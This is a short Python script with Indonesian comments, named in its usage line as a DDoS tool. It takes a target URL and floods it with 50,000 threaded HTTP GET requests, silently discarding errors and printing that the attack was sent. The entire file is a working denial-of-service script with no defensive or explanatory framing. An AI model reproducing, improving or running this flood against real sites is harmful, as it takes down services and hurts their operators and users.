import requests
import threading
import sys
import time

# Fungsi untuk mengirim request
def send(url):
    try:
        requests.get(url)
    except Exception as e:
        pass  # Tidak ada output error

# Fungsi utama untuk melakukan DDoS
def attack(url):
    print(f"\n[+] Proses Mengirim Serangan Ke IP Tersebut: {url}")
    
    threads = []
    start_time = time.time()

    # Menjalankan thread untuk mengirim request
    for _ in range(50000):  # 50.000 request secara otomatis
        thread = threading.Thread(target=send, args=(url,))
        thread.start()
        threads.append(thread)

    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

    end_time = time.time()
    print(f"[✓] Selesai Mengirim Serangan (50.000 request) dalam {end_time - start_time:.2f} detik\n")

# Fungsi utama yang menerima input dan memulai serangan
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python DDoS-V0.5.py <url>")
    else:
        url = sys.argv[1]  # URL target
        attack(url)